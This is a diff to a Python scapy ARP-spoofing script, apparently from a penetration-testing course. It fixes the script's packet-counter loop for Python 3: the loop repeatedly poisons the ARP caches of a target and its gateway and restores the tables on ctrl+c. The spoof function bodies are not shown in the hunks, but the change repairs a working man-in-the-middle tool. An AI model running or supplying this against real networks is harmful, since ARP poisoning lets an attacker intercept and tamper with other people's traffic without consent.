@@ -9,8 +9,8 @@
 #               
 
 import scapy.all as scapy
-import time 
-import sys
+import time
+
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -39,10 +39,9 @@ try:
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
-        packets_sent_count = packet_sent_count + 2
-        print("\r[+] Sent " + str(packets_sent_count)),
-        sys.stdout.flush()
-        time.sleep(2)
+        packet_sent_count = packet_sent_count + 2
+        print("\r[+] Sent " + str(packet_sent_count), end='')
+        time.sleep(1)
 except KeyboardInterrupt:
     print("\n [-] Detected ctrl+c ... Resetting ARP tables... PLease wait.\n")
     restore(target_ip, gateway_ip)
